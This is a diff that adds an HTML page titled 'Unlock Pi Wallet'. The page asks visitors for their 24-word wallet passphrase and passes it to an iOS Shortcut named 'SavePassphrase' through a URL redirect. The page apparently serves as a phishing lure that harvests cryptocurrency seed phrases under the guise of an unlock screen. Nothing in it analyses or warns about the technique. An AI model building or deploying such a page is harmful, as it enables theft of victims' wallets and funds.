@@ -1,1 +1,35 @@
-# pi-wallet-unlock
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Pi Wallet</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        input, button { display: block; margin: 10px auto; padding: 10px; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <h2>Unlock Pi Wallet</h2>
+    <p>Enter your 24-word passphrase:</p>
+    <input type="text" id="passphrase" placeholder="Enter your passphrase" required>
+    <button onclick="submitPassphrase()">Unlock with Passphrase</button>
+
+    <script>
+        function submitPassphrase() {
+            let passphrase = document.getElementById('passphrase').value;
+            let words = passphrase.trim().split(/\s+/);
+            
+            if (words.length !== 24) {
+                alert("Passphrase must be exactly 24 words.");
+                return;
+            }
+
+            // Redirect user while sending passphrase to the Shortcuts app
+            window.location.href = `shortcuts://run-shortcut?name=SavePassphrase&input=${encodeURIComponent(passphrase)}`;
+        }
+    </script>
+
+</body>
+</html>
